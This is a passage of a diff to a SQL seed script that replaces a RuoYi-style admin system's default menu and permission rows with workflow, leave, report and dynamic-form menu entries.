+        'build', 'admin', '2021-10-07 12:15:19', 'admin', '2022-08-19 20:47:02', ''),
+       ('请假业务', 5, 1, 'leave', 'demo/leave/index', '', 1, 1, 'C', '0', '0', 'demo:leave:list', '#', 'admin',
+        '2021-10-10 12:04:10', 'admin', '2022-03-26 15:25:54', '请假业务菜单'),
+       ('请假业务查询', 3003, 1, '#', '', '', 1, 0, 'F', '0', '0', 'demo:leave:query', '#', 'admin', '2021-10-10 12:04:10',
+        '', NULL, ''),
+       ('请假业务新增', 3003, 2, '#', '', '', 1, 0, 'F', '0', '0', 'demo:leave:add', '#', 'admin', '2021-10-10 12:04:10', '',
+        NULL, ''),
+       ('请假业务修改', 3003, 3, '#', '', '', 1, 0, 'F', '0', '0', 'demo:leave:edit', '#', 'admin', '2021-10-10 12:04:10', '',
+        NULL, ''),
+       ('请假业务删除', 3003, 4, '#', '', '', 1, 0, 'F', '0', '0', 'demo:leave:remove', '#', 'admin', '2021-10-10 12:04:10',
+        '', NULL, ''),
+       ('请假业务导出', 3003, 5, '#', '', '', 1, 0, 'F', '0', '0', 'demo:leave:export', '#', 'admin', '2021-10-10 12:04:10',
+        '', NULL, ''),
+       ('运行中', 2021, 40, 'instacneRunning', 'workflow/instance/running', '', 1, 0, 'C', '0', '0', '', 'build', 'admin',
+        '2021-10-16 20:33:59', 'admin', '2022-08-19 20:51:50', '');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('待办任务', 3000, 50, 'taskWaiting', 'workflow/task/waiting', '', 1, 0, 'C', '0', '0', '', 'build', 'admin',
+        '2021-10-17 16:12:12', 'admin', '2022-08-19 20:51:10', ''),
+       ('已完成', 2021, 50, 'instanceFinish', 'workflow/instance/finish', '', 1, 0, 'C', '0', '0', '', 'build', 'admin',
+        '2021-10-23 14:30:54', 'admin', '2022-08-19 20:52:04', ''),
+       ('已办任务', 3000, 60, 'taskFinish', 'workflow/task/finish', '', 1, 0, 'C', '0', '0', '', 'build', 'admin',
+        '2021-10-23 15:16:59', 'admin', '2022-08-19 20:51:42', ''),
+       ('消息中心', 0, 10, 'workflowPersonal', '', '', 1, 0, 'M', '0', '0', '', 'build', 'admin', '2022-02-19 14:44:15',
+        'admin', '2022-02-19 14:44:15', ''),
+       ('待办任务', 1494925781048545281, 20, 'personalWaiting', 'workflow/task/personalWaiting', '', 1, 1, 'C', '0', '0',
+        '', 'build', 'admin', '2022-02-19 14:46:09', 'admin', '2022-02-19 14:46:09', ''),
+       ('已办任务', 1494925781048545281, 30, 'personalFinish', 'workflow/task/personalFinish', '', 1, 1, 'C', '0', '0', '',
+        'build', 'admin', '2022-02-19 14:47:27', 'admin', '2022-02-19 14:48:03', ''),
+       ('业务规则', 1560609093179654146, 30, 'businessRule', 'workflow/businessRule/index', '', 1, 0, 'C', '0', '0',
+        'workflow:businessRule:list', 'build', 'admin', '2022-02-19 14:51:05', 'admin', '2022-08-19 20:49:29',
+        '业务规则菜单'),
+       ('业务规则查询', 1494926586677874691, 1, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:businessRule:query', '#', 'admin',
+        '2022-02-19 14:51:06', 'admin', '2022-07-15 21:14:15', ''),
+       ('业务规则新增', 1494926586677874691, 2, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:businessRule:add', '#', 'admin',
+        '2022-02-19 14:51:06', 'admin', '2022-07-15 21:14:56', ''),
+       ('业务规则修改', 1494926586677874691, 3, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:businessRule:edit', '#', 'admin',
+        '2022-02-19 14:51:06', 'admin', '2022-07-15 21:15:08', '');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('业务规则删除', 1494926586677874691, 4, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:businessRule:remove', '#',
+        'admin', '2022-02-19 14:51:06', 'admin', '2022-07-15 21:15:18', ''),
+       ('业务规则导出', 1494926586677874691, 5, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:businessRule:export', '#',
+        'admin', '2022-02-19 14:51:06', 'admin', '2022-07-15 21:15:46', ''),
+       ('消息通知', 1494925781048545281, 1, 'message', 'workflow/message/index', '', 1, 0, 'C', '0', '0',
+        'workflow:message:list', 'build', 'admin', '2022-06-17 19:49:35', 'admin', '2022-08-19 20:50:16', '消息通知菜单'),
+       ('消息通知查询', 1537763506351398912, 1, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:message:query', '#', 'admin',
+        '2022-06-17 19:49:35', '', NULL, ''),
+       ('消息通知新增', 1537763506351398912, 2, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:message:add', '#', 'admin',
+        '2022-06-17 19:49:35', '', NULL, ''),
+       ('消息通知修改', 1537763506351398912, 3, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:message:edit', '#', 'admin',
+        '2022-06-17 19:49:35', '', NULL, ''),
+       ('消息通知删除', 1537763506351398912, 4, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:message:remove', '#', 'admin',
+        '2022-06-17 19:49:35', '', NULL, ''),
+       ('消息通知导出', 1537763506351398912, 5, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:message:export', '#', 'admin',
+        '2022-06-17 19:49:35', '', NULL, ''),
+       ('报表管理', 0, 8, 'report', '', '', 1, 0, 'M', '0', '0', '', 'chart', 'admin', '2022-06-18 17:24:41', 'admin',
+        '2022-08-19 20:50:27', ''),
+       ('设计报表', 1538090311987884033, 1, 'jmreport', 'jmreport/index', '', 1, 0, 'C', '0', '0', '', '#', 'admin',
+        '2022-06-18 17:25:33', 'admin', '2022-08-06 19:42:27', '');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('报表查看', 1538090311987884033, 2, 'reportView', 'jmreport/view', '', 1, 0, 'C', '0', '0',
+        'report:reportView:list', '#', 'admin', '2022-08-07 19:53:34', 'admin', '2022-08-07 19:55:51', '报表查看菜单'),
+       ('报表查看查询', 1556235156136067072, 1, '#', '', '', 1, 0, 'F', '0', '0', 'report:reportView:query', '#', 'admin',
+        '2022-08-07 19:53:34', '', NULL, ''),
+       ('报表查看新增', 1556235156136067072, 2, '#', '', '', 1, 0, 'F', '0', '0', 'report:reportView:add', '#', 'admin',
+        '2022-08-07 19:53:34', '', NULL, ''),
+       ('报表查看修改', 1556235156136067072, 3, '#', '', '', 1, 0, 'F', '0', '0', 'report:reportView:edit', '#', 'admin',
+        '2022-08-07 19:53:34', '', NULL, ''),
+       ('报表查看删除', 1556235156136067072, 4, '#', '', '', 1, 0, 'F', '0', '0', 'report:reportView:remove', '#', 'admin',
+        '2022-08-07 19:53:34', '', NULL, ''),
+       ('报表查看导出', 1556235156136067072, 5, '#', '', '', 1, 0, 'F', '0', '0', 'report:reportView:export', '#', 'admin',
+        '2022-08-07 19:53:34', '', NULL, ''),
+       ('表单设计', 1560607731675021314, 20, 'dynamicForm', 'workflow/dynamicForm/index', '', 1, 0, 'C', '0', '0',
+        'workflow:dynamicForm:list', 'build', 'admin', '2022-08-11 20:40:34', 'admin', '2022-08-30 21:54:23', '流程单菜单'),
+       ('动态表单查询', 1557707072126521344, 1, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:dynamicForm:query', '#', 'admin',
+        '2022-08-11 20:40:34', 'admin', '2022-08-30 21:53:36', ''),
+       ('动态表单新增', 1557707072126521344, 2, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:dynamicForm:add', '#', 'admin',
+        '2022-08-11 20:40:34', 'admin', '2022-08-30 21:53:22', ''),
+       ('动态表单修改', 1557707072126521344, 3, '', '', '', 1, 0, 'F', '0', '0', 'workflow:dynamicForm:edit', '#', 'admin',
+        '2022-08-11 20:40:34', 'admin', '2022-08-30 21:53:06', '');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('动态表单删除', 1557707072126521344, 4, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:dynamicForm:remove', '#', 'admin',
+        '2022-08-11 20:40:34', 'admin', '2022-08-30 21:52:54', ''),
+       ('动态表单导出', 1557707072126521344, 5, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:dynamicForm:export', '#', 'admin',
+        '2022-08-11 20:40:34', 'admin', '2022-08-30 21:52:31', ''),
+       ('我的单据', 1560607731675021314, 30, 'businessForm', 'workflow/businessForm/index', '', 1, 1, 'C', '0', '0',
+        'workflow:businessForm:list', 'build', 'admin', '2022-08-19 16:57:39', 'admin', '2022-08-20 18:26:51',
+        '业务表单菜单'),
+       ('业务表单查询', 1560523639527620608, 1, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:businessForm:query', '#', 'admin',
+        '2022-08-19 16:57:39', '', NULL, ''),
+       ('业务表单新增', 1560523639527620608, 2, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:businessForm:add', '#', 'admin',
+        '2022-08-19 16:57:39', '', NULL, ''),
+       ('业务表单修改', 1560523639527620608, 3, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:businessForm:edit', '#', 'admin',
+        '2022-08-19 16:57:39', '', NULL, ''),
+       ('业务表单删除', 1560523639527620608, 4, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:businessForm:remove', '#',
+        'admin', '2022-08-19 16:57:39', '', NULL, ''),
+       ('业务表单导出', 1560523639527620608, 5, '#', '', '', 1, 0, 'F', '0', '0', 'workflow:businessForm:export', '#',
+        'admin', '2022-08-19 16:57:39', '', NULL, ''),
+       ('启动流程', 3000, 40, 'dynamicFormEnableList', 'workflow/dynamicForm/dynamicFormEnableList', '', 1, 1, 'C', '0',
+        '0', '', 'build', 'admin', '2022-08-19 18:14:40', 'admin', '2022-08-30 22:00:33', ''),
+       ('表单管理', 3000, 20, 'from', '', '', 1, 0, 'M', '0', '0', '', 'build', 'admin', '2022-08-19 20:40:53', 'admin',
+        '2022-08-19 20:40:53', '');
+INSERT INTO melon.sys_menu (menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type,
+                            visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
+VALUES ('流程管理', 3000, 10, 'process', '', '', 1, 0, 'M', '0', '0', '', 'build', 'admin', '2022-08-19 20:46:17', 'admin',
+        '2022-08-19 20:48:59', '');
 
 
--- 一级菜单
-insert into sys_menu values('1', '系统管理', '0', '1', 'system',           null, '', 1, 0, 'M', '0', '0', '', 'system',   'admin', sysdate(), '', null, '系统管理目录');
-insert into sys_menu values('2', '系统监控', '0', '2', 'monitor',          null, '', 1, 0, 'M', '0', '0', '', 'monitor',  'admin', sysdate(), '', null, '系统监控目录');
-insert into sys_menu values('3', '系统工具', '0', '3', 'tool',             null, '', 1, 0, 'M', '0', '0', '', 'tool',     'admin', sysdate(), '', null, '系统工具目录');
-insert into sys_menu values('4', '若依官网', '0', '4', 'http://ruoyi.vip', null, '', 0, 0, 'M', '0', '0', '', 'guide',    'admin', sysdate(), '', null, '若依官网地址');
--- 二级菜单
-insert into sys_menu values('100',  '用户管理', '1',   '1', 'user',       'system/user/index',        '', 1, 0, 'C', '0', '0', 'system:user:list',        'user',          'admin', sysdate(), '', null, '用户管理菜单');
-insert into sys_menu values('101',  '角色管理', '1',   '2', 'role',       'system/role/index',        '', 1, 0, 'C', '0', '0', 'system:role:list',        'peoples',       'admin', sysdate(), '', null, '角色管理菜单');
-insert into sys_menu values('102',  '菜单管理', '1',   '3', 'menu',       'system/menu/index',        '', 1, 0, 'C', '0', '0', 'system:menu:list',        'tree-table',    'admin', sysdate(), '', null, '菜单管理菜单');
-insert into sys_menu values('103',  '部门管理', '1',   '4', 'dept',       'system/dept/index',        '', 1, 0, 'C', '0', '0', 'system:dept:list',        'tree',          'admin', sysdate(), '', null, '部门管理菜单');
-insert into sys_menu values('104',  '岗位管理', '1',   '5', 'post',       'system/post/index',        '', 1, 0, 'C', '0', '0', 'system:post:list',        'post',          'admin', sysdate(), '', null, '岗位管理菜单');
-insert into sys_menu values('105',  '字典管理', '1',   '6', 'dict',       'system/dict/index',        '', 1, 0, 'C', '0', '0', 'system:dict:list',        'dict',          'admin', sysdate(), '', null, '字典管理菜单');
-insert into sys_menu values('106',  '参数设置', '1',   '7', 'config',     'system/config/index',      '', 1, 0, 'C', '0', '0', 'system:config:list',      'edit',          'admin', sysdate(), '', null, '参数设置菜单');
-insert into sys_menu values('107',  '通知公告', '1',   '8', 'notice',     'system/notice/index',      '', 1, 0, 'C', '0', '0', 'system:notice:list',      'message',       'admin', sysdate(), '', null, '通知公告菜单');
-insert into sys_menu values('108',  '日志管理', '1',   '9', 'log',        '',                         '', 1, 0, 'M', '0', '0', '',                        'log',           'admin', sysdate(), '', null, '日志管理菜单');
-insert into sys_menu values('109',  '在线用户', '2',   '1', 'online',     'monitor/online/index',     '', 1, 0, 'C', '0', '0', 'monitor:online:list',     'online',        'admin', sysdate(), '', null, '在线用户菜单');
-insert into sys_menu values('110',  '定时任务', '2',   '2', 'job',        'monitor/job/index',        '', 1, 0, 'C', '0', '0', 'monitor:job:list',        'job',           'admin', sysdate(), '', null, '定时任务菜单');
-insert into sys_menu values('111',  '数据监控', '2',   '3', 'druid',      'monitor/druid/index',      '', 1, 0, 'C', '0', '0', 'monitor:druid:list',      'druid',         'admin', sysdate(), '', null, '数据监控菜单');
-insert into sys_menu values('112',  '服务监控', '2',   '4', 'server',     'monitor/server/index',     '', 1, 0, 'C', '0', '0', 'monitor:server:list',     'server',        'admin', sysdate(), '', null, '服务监控菜单');
-insert into sys_menu values('113',  '缓存监控', '2',   '5', 'cache',      'monitor/cache/index',      '', 1, 0, 'C', '0', '0', 'monitor:cache:list',      'redis',         'admin', sysdate(), '', null, '缓存监控菜单');
-insert into sys_menu values('114',  '缓存列表', '2',   '6', 'cacheList',  'monitor/cache/list',       '', 1, 0, 'C', '0', '0', 'monitor:cache:list',      'redis-list',    'admin', sysdate(), '', null, '缓存列表菜单');
-insert into sys_menu values('115',  '表单构建', '3',   '1', 'build',      'tool/build/index',         '', 1, 0, 'C', '0', '0', 'tool:build:list',         'build',         'admin', sysdate(), '', null, '表单构建菜单');
-insert into sys_menu values('116',  '代码生成', '3',   '2', 'gen',        'tool/gen/index',           '', 1, 0, 'C', '0', '0', 'tool:gen:list',           'code',          'admin', sysdate(), '', null, '代码生成菜单');
-insert into sys_menu values('117',  '系统接口', '3',   '3', 'swagger',    'tool/swagger/index',       '', 1, 0, 'C', '0', '0', 'tool:swagger:list',       'swagger',       'admin', sysdate(), '', null, '系统接口菜单');
--- 三级菜单
-insert into sys_menu values('500',  '操作日志', '108', '1', 'operlog',    'monitor/operlog/index',    '', 1, 0, 'C', '0', '0', 'monitor:operlog:list',    'form',          'admin', sysdate(), '', null, '操作日志菜单');
-insert into sys_menu values('501',  '登录日志', '108', '2', 'logininfor', 'monitor/logininfor/index', '', 1, 0, 'C', '0', '0', 'monitor:logininfor:list', 'logininfor',    'admin', sysdate(), '', null, '登录日志菜单');
--- 用户管理按钮
-insert into sys_menu values('1000', '用户查询', '100', '1',  '', '', '', 1, 0, 'F', '0', '0', 'system:user:query',          '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1001', '用户新增', '100', '2',  '', '', '', 1, 0, 'F', '0', '0', 'system:user:add',            '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1002', '用户修改', '100', '3',  '', '', '', 1, 0, 'F', '0', '0', 'system:user:edit',           '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1003', '用户删除', '100', '4',  '', '', '', 1, 0, 'F', '0', '0', 'system:user:remove',         '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1004', '用户导出', '100', '5',  '', '', '', 1, 0, 'F', '0', '0', 'system:user:export',         '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1005', '用户导入', '100', '6',  '', '', '', 1, 0, 'F', '0', '0', 'system:user:import',         '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1006', '重置密码', '100', '7',  '', '', '', 1, 0, 'F', '0', '0', 'system:user:resetPwd',       '#', 'admin', sysdate(), '', null, '');
--- 角色管理按钮
-insert into sys_menu values('1007', '角色查询', '101', '1',  '', '', '', 1, 0, 'F', '0', '0', 'system:role:query',          '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1008', '角色新增', '101', '2',  '', '', '', 1, 0, 'F', '0', '0', 'system:role:add',            '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1009', '角色修改', '101', '3',  '', '', '', 1, 0, 'F', '0', '0', 'system:role:edit',           '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1010', '角色删除', '101', '4',  '', '', '', 1, 0, 'F', '0', '0', 'system:role:remove',         '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1011', '角色导出', '101', '5',  '', '', '', 1, 0, 'F', '0', '0', 'system:role:export',         '#', 'admin', sysdate(), '', null, '');
--- 菜单管理按钮
-insert into sys_menu values('1012', '菜单查询', '102', '1',  '', '', '', 1, 0, 'F', '0', '0', 'system:menu:query',          '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1013', '菜单新增', '102', '2',  '', '', '', 1, 0, 'F', '0', '0', 'system:menu:add',            '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1014', '菜单修改', '102', '3',  '', '', '', 1, 0, 'F', '0', '0', 'system:menu:edit',           '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1015', '菜单删除', '102', '4',  '', '', '', 1, 0, 'F', '0', '0', 'system:menu:remove',         '#', 'admin', sysdate(), '', null, '');
--- 部门管理按钮
-insert into sys_menu values('1016', '部门查询', '103', '1',  '', '', '', 1, 0, 'F', '0', '0', 'system:dept:query',          '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1017', '部门新增', '103', '2',  '', '', '', 1, 0, 'F', '0', '0', 'system:dept:add',            '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1018', '部门修改', '103', '3',  '', '', '', 1, 0, 'F', '0', '0', 'system:dept:edit',           '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1019', '部门删除', '103', '4',  '', '', '', 1, 0, 'F', '0', '0', 'system:dept:remove',         '#', 'admin', sysdate(), '', null, '');
--- 岗位管理按钮
-insert into sys_menu values('1020', '岗位查询', '104', '1',  '', '', '', 1, 0, 'F', '0', '0', 'system:post:query',          '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1021', '岗位新增', '104', '2',  '', '', '', 1, 0, 'F', '0', '0', 'system:post:add',            '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1022', '岗位修改', '104', '3',  '', '', '', 1, 0, 'F', '0', '0', 'system:post:edit',           '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1023', '岗位删除', '104', '4',  '', '', '', 1, 0, 'F', '0', '0', 'system:post:remove',         '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1024', '岗位导出', '104', '5',  '', '', '', 1, 0, 'F', '0', '0', 'system:post:export',         '#', 'admin', sysdate(), '', null, '');
--- 字典管理按钮
-insert into sys_menu values('1025', '字典查询', '105', '1', '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:query',          '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1026', '字典新增', '105', '2', '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:add',            '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1027', '字典修改', '105', '3', '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:edit',           '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1028', '字典删除', '105', '4', '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:remove',         '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1029', '字典导出', '105', '5', '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:export',         '#', 'admin', sysdate(), '', null, '');
--- 参数设置按钮
-insert into sys_menu values('1030', '参数查询', '106', '1', '#', '', '', 1, 0, 'F', '0', '0', 'system:config:query',        '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1031', '参数新增', '106', '2', '#', '', '', 1, 0, 'F', '0', '0', 'system:config:add',          '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1032', '参数修改', '106', '3', '#', '', '', 1, 0, 'F', '0', '0', 'system:config:edit',         '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1033', '参数删除', '106', '4', '#', '', '', 1, 0, 'F', '0', '0', 'system:config:remove',       '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1034', '参数导出', '106', '5', '#', '', '', 1, 0, 'F', '0', '0', 'system:config:export',       '#', 'admin', sysdate(), '', null, '');
--- 通知公告按钮
-insert into sys_menu values('1035', '公告查询', '107', '1', '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:query',        '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1036', '公告新增', '107', '2', '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:add',          '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1037', '公告修改', '107', '3', '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:edit',         '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1038', '公告删除', '107', '4', '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:remove',       '#', 'admin', sysdate(), '', null, '');
--- 操作日志按钮
-insert into sys_menu values('1039', '操作查询', '500', '1', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:operlog:query',      '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1040', '操作删除', '500', '2', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:operlog:remove',     '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1041', '日志导出', '500', '3', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:operlog:export',     '#', 'admin', sysdate(), '', null, '');
--- 登录日志按钮
-insert into sys_menu values('1042', '登录查询', '501', '1', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:query',   '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1043', '登录删除', '501', '2', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:remove',  '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1044', '日志导出', '501', '3', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:export',  '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1045', '账户解锁', '501', '4', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:unlock',  '#', 'admin', sysdate(), '', null, '');
--- 在线用户按钮
-insert into sys_menu values('1046', '在线查询', '109', '1', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:online:query',       '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1047', '批量强退', '109', '2', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:online:batchLogout', '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1048', '单条强退', '109', '3', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:online:forceLogout', '#', 'admin', sysdate(), '', null, '');
--- 定时任务按钮
-insert into sys_menu values('1049', '任务查询', '110', '1', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:query',          '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1050', '任务新增', '110', '2', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:add',            '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1051', '任务修改', '110', '3', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:edit',           '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1052', '任务删除', '110', '4', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:remove',         '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1053', '状态修改', '110', '5', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:changeStatus',   '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1054', '任务导出', '110', '6', '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:export',         '#', 'admin', sysdate(), '', null, '');
--- 代码生成按钮
-insert into sys_menu values('1055', '生成查询', '116', '1', '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:query',             '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1056', '生成修改', '116', '2', '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:edit',              '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1057', '生成删除', '116', '3', '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:remove',            '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1058', '导入代码', '116', '4', '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:import',            '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1059', '预览代码', '116', '5', '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:preview',           '#', 'admin', sysdate(), '', null, '');
-insert into sys_menu values('1060', '生成代码', '116', '6', '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:code',              '#', 'admin', sysdate(), '', null, '');
-
--- 自定义菜单
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2000, '配置管理', 0, 4, 'config', '', '', 1, 0, 'M', '0', '0', '', 'component', 'admin', '2023-01-25 12:00:23', 'admin', '2023-01-25 13:18:04', '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2001, '配置列表', 2000, 1, 'config', 'config/conf/index', '', 1, 0, 'C', '0', '0', 'config:project:list', 'code', 'admin', '2023-01-25 12:02:03', 'SSSDNSY', '2023-03-27 16:09:34', '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2002, '环境管理', 2000, 2, 'env', 'config/env/index', '', 1, 0, 'C', '0', '0', '', 'swagger', 'admin', '2023-01-25 13:13:34', 'admin', '2023-01-25 13:14:35', '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2003, '项目管理', 2000, 3, 'project', 'config/project/index', '', 1, 0, 'C', '0', '0', '', 'example', 'admin', '2023-01-25 13:14:09', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2004, '编辑权限', 2001, 1, '', '', '', 1, 0, 'F', '0', '0', 'config:conf:edit', '#', 'SSSDNSY', '2023-03-27 16:08:02', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2005, '导出权限', 2001, 2, '', '', '', 1, 0, 'F', '0', '0', 'config:conf:export', '#', 'SSSDNSY', '2023-03-27 16:08:48', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2006, '查询权限', 2001, 3, '', '', '', 1, 0, 'F', '0', '0', 'config:conf:list', '#', 'admin', '2023-03-27 16:18:27', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2007, '编辑权限', 2002, 1, '', '', '', 1, 0, 'F', '0', '0', 'config:env:edit', '#', 'SSSDNSY', '2023-03-27 16:08:02', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2008, '导出权限', 2002, 2, '', '', '', 1, 0, 'F', '0', '0', 'config:env:export', '#', 'SSSDNSY', '2023-03-27 16:08:48', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2009, '查询权限', 2002, 3, '', '', '', 1, 0, 'F', '0', '0', 'config:env:list', '#', 'admin', '2023-03-27 16:18:27', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2010, '编辑权限', 2003, 1, '', '', '', 1, 0, 'F', '0', '0', 'config:project:edit', '#', 'SSSDNSY', '2023-03-27 16:08:02', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
